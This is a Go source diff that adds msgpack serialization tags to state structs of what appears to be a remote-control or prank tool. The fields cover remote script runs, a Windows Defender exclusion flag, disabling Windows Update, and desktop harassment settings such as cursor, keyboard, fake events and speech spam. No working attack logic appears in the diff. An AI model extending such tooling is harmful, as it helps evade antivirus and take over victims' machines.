@@ -13,11 +13,11 @@ import (
 )
 
 type ScriptFile struct {
-	Name     string `json:"name"`
-	Size     int64  `json:"size"`
-	Type     string `json:"type"`
-	Path     string `json:"path"`
-	Checksum string `json:"checksum"`
+	Name     string `json:"name" msgpack:"name"`
+	Size     int64  `json:"size" msgpack:"size"`
+	Type     string `json:"type" msgpack:"type"`
+	Path     string `json:"path" msgpack:"path"`
+	Checksum string `json:"checksum" msgpack:"checksum"`
 }
 
 type ScriptPayload struct {
@@ -34,38 +34,38 @@ type ManagerOptions struct {
 }
 
 type ScriptConfig struct {
-	File         *ScriptFile `json:"file,omitempty"`
-	Mode         string      `json:"mode"`
-	Loop         bool        `json:"loop"`
-	DelaySeconds int         `json:"delaySeconds"`
+	File         *ScriptFile `json:"file,omitempty" msgpack:"file,omitempty"`
+	Mode         string      `json:"mode" msgpack:"mode"`
+	Loop         bool        `json:"loop" msgpack:"loop"`
+	DelaySeconds int         `json:"delaySeconds" msgpack:"delaySeconds"`
 }
 
 type ScriptRuntimeState struct {
-	Status          string    `json:"status"`
-	Active          bool      `json:"active"`
-	LastStartedAt   time.Time `json:"lastStartedAt"`
-	LastCompletedAt time.Time `json:"lastCompletedAt"`
-	LastExitCode    int       `json:"lastExitCode"`
-	HasExitCode     bool      `json:"hasExitCode"`
-	LastError       string    `json:"lastError"`
-	Runs            int64     `json:"runs"`
+	Status          string    `json:"status" msgpack:"status"`
+	Active          bool      `json:"active" msgpack:"active"`
+	LastStartedAt   time.Time `json:"lastStartedAt" msgpack:"lastStartedAt"`
+	LastCompletedAt time.Time `json:"lastCompletedAt" msgpack:"lastCompletedAt"`
+	LastExitCode    int       `json:"lastExitCode" msgpack:"lastExitCode"`
+	HasExitCode     bool      `json:"hasExitCode" msgpack:"hasExitCode"`
+	LastError       string    `json:"lastError" msgpack:"lastError"`
+	Runs            int64     `json:"runs" msgpack:"runs"`
 }
 
 type State struct {
-	DefenderExclusion bool               `json:"defenderExclusion"`
-	WindowsUpdate     bool               `json:"windowsUpdate"`
-	VisualDistortion  string             `json:"visualDistortion"`
-	ScreenOrientation string             `json:"screenOrientation"`
-	WallpaperMode     string             `json:"wallpaperMode"`
-	CursorBehavior    string             `json:"cursorBehavior"`
-	KeyboardMode      string             `json:"keyboardMode"`
-	SoundPlayback     bool               `json:"soundPlayback"`
-	SoundVolume       int                `json:"soundVolume"`
-	Script            ScriptConfig       `json:"script"`
-	ScriptRuntime     ScriptRuntimeState `json:"scriptRuntime"`
-	FakeEventMode     string             `json:"fakeEventMode"`
-	SpeechSpam        bool               `json:"speechSpam"`
-	AutoMinimize      bool               `json:"autoMinimize"`
+	DefenderExclusion bool               `json:"defenderExclusion" msgpack:"defenderExclusion"`
+	WindowsUpdate     bool               `json:"windowsUpdate" msgpack:"windowsUpdate"`
+	VisualDistortion  string             `json:"visualDistortion" msgpack:"visualDistortion"`
+	ScreenOrientation string             `json:"screenOrientation" msgpack:"screenOrientation"`
+	WallpaperMode     string             `json:"wallpaperMode" msgpack:"wallpaperMode"`
+	CursorBehavior    string             `json:"cursorBehavior" msgpack:"cursorBehavior"`
+	KeyboardMode      string             `json:"keyboardMode" msgpack:"keyboardMode"`
+	SoundPlayback     bool               `json:"soundPlayback" msgpack:"soundPlayback"`
+	SoundVolume       int                `json:"soundVolume" msgpack:"soundVolume"`
+	Script            ScriptConfig       `json:"script" msgpack:"script"`
+	ScriptRuntime     ScriptRuntimeState `json:"scriptRuntime" msgpack:"scriptRuntime"`
+	FakeEventMode     string             `json:"fakeEventMode" msgpack:"fakeEventMode"`
+	SpeechSpam        bool               `json:"speechSpam" msgpack:"speechSpam"`
+	AutoMinimize      bool               `json:"autoMinimize" msgpack:"autoMinimize"`
 }
 
 type Manager struct {
